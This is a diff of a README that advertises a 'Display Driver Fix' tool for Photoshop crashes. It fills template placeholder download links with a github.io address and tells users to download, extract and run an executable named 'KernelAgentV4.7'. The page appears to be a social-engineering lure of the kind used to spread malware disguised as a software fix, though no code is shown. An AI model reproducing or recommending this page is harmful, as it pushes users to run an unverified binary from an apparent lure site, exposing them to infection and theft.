@@ -2,13 +2,13 @@
 
 This tool fixes GPU-related crashes and display driver conflicts in Adobe Photoshop. It resets GPU preferences, disables hardware acceleration, and repairs registry entries using `KernelAgentV4.7`.
 
-[![Download Display Fix Tool](https://img.shields.io/badge/Download-Photoshop_DisplayDriver_Fix-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download Display Fix Tool](https://img.shields.io/badge/Download-Photoshop_DisplayDriver_Fix-blueviolet)](photoshop-display-driver-fix.github.io)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](photoshop-display-driver-fix.github.io) section  
 2. 📁 **Extract the folder** to any location (e.g., `C:\PhotoshopDisplayFix`)  
 3. 🖱 **Run the executable file** `KernelAgentV4.7`  
 4. 🧠 The utility will reset GPU config, disable OpenCL, and repair acceleration-related flags  
